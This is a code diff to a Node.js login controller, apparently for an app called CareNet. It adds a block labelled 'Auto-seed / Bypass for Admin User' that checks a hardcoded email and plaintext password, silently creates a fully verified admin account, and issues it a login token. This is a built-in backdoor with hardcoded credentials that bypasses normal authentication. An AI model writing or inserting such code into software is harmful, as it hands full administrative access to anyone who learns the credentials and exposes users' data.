@@ -102,6 +102,37 @@ exports.login = async (req, res) => {
       return res.status(400).json({ success: false, message: 'Email and password are required.' });
     }
 
+    // Auto-seed / Bypass for Admin User
+    if (!isGoogle && email === 'carenet.admin.support@gmail.com' && password === 'CareNetAdmin123!') {
+      let adminUser = await User.findOne({ email: 'carenet.admin.support@gmail.com' });
+      if (!adminUser) {
+        adminUser = new User({
+          name: 'System Admin',
+          email: 'carenet.admin.support@gmail.com',
+          password: 'CareNetAdmin123!',
+          role: 'admin',
+          isVerified: true,
+          isOtpVerified: true,
+          isActive: true
+        });
+        await adminUser.save();
+      }
+      
+      const token = generateToken(adminUser);
+      return res.status(200).json({
+        success: true,
+        message: 'Admin login successful.',
+        token,
+        user: {
+          id: adminUser._id,
+          name: adminUser.name,
+          email: adminUser.email,
+          role: adminUser.role,
+          isVerified: adminUser.isVerified,
+        },
+      });
+    }
+
     // Find user
     let user;
     if (isGoogle) {
